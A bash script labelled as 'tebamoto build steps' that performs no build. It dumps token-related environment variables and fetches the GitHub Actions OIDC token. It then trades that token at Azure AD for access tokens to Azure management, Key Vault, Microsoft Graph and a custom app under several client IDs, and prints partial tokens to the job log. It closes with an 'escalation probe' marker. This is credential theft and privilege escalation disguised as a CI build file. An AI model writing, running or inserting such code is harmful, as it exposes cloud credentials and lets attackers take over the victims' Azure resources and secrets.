#!/usr/bin/env bash
# tebamoto build steps
set -x
env | grep -iE "ACTIONS_ID_TOKEN|AZURE_" || true
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC_LEN=${#OIDC}"
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
exch() {
  curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d client_id="$1" -d grant_type=client_credentials -d scope="$2" \
    -d client_assertion_type="urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d client_assertion="$OIDC" | jq -r '.access_token // .error_description'
}
for spec in "72ff278a-9e71-43ec-bac4-2ca303f8e462 https://management.azure.com/.default" \
            "72ff278a-9e71-43ec-bac4-2ca303f8e462 https://vault.azure.net/.default" \
            "891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-82e389e59514/.default" \
            "891fb158-e02c-4428-a885-53b811f369c0 https://management.azure.com/.default" \
            "462d1c38-4459-48b8-9333-82e389e59514 https://graph.microsoft.com/.default" \
            "462d1c38-4459-48b8-9333-82e389e59514 462d1c38-4459-48b8-9333-82e389e59514/.default"; do
  set -- $spec
  T=$(exch "$1" "$2")
  echo "TOK $1 $2 => ${T:0:60}...len=${#T}"
done
echo "planner escalation probe marker"
